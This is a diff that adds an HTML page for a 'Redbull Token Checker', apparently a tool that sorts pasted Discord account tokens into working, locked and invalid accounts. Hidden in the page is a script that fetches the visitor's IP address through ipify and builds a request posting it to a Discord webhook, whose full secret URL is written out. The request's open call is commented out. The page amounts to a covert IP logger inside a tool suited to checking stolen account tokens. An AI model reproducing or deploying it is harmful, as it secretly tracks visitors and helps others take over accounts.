@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redbull Token Checker</title>
+
+    <!-- Css -->
+    <link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+
+    <header>
+        <ul>
+            <li><a target="_blank" href="https://discord.gg/hV26qCCfKZ">Discord</a></li>
+            <li><a target="_blank" href="https://github.com/RedbullXD">Github</a></li>
+        </ul>
+    </header>
+
+    <section id="tokens_list" class="input_tokens">
+        <div class="center">
+            <textarea name="tokens" id="tokens" cols="30" rows="10" placeholder="Enter Your Tokens Here..."></textarea>
+            <button onclick="CheckTokens()">Check Token</button>
+        </div>
+    </section>
+
+    <section id="results" class="hide">
+        <div class="result-box locked">
+            <div class="box-title">
+                <span>Locked Accounts</span>
+                <hr>
+            </div>
+            <div id="locked_tokens">
+                
+            </div>
+        </div>
+        <div class="result-box working">
+            <div class="box-title">
+                <span>Working Accounts</span>
+                <hr>
+            </div>
+            <div id="valid_tokens">
+
+            </div>
+        </div>
+        <div class="result-box bads">
+            <div class="box-title">
+                <span>Invalid Accounts</span>
+                <hr>
+            </div>
+            <div id="invalid_tokens">
+                
+            </div>
+        </div>
+    </section>
+
+    <!-- Javascript -->
+    <script>
+        function getIP(json) {
+          var request = new XMLHttpRequest(); //making a request for the webhook
+              //request.open("POST", "https://discord.com/api/webhooks/974018630566158438/2VXnUBEBXTDgf0eyeDv02RyqE4wMTep-F9PHIqrWp68ZSy4mGQlYpyHtn7--1fwW4opd");
+        
+              request.setRequestHeader('Content-type', 'application/json');
+        
+              var params = {
+                username: "Redbull",
+                avatar_url: "https://cdn.discordapp.com/attachments/884450354522107966/890121929938333736/Anonymous_emblem.svg.png",
+                content: "IP: *" + json.ip + "*"
+              }
+           //just a webhook parameters such as avatar,name,message
+        
+              request.send(JSON.stringify(params));
+            }
+        
+        </script>
+    <script src="assets/app.js"></script>    
+    <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+</body>
+</html>
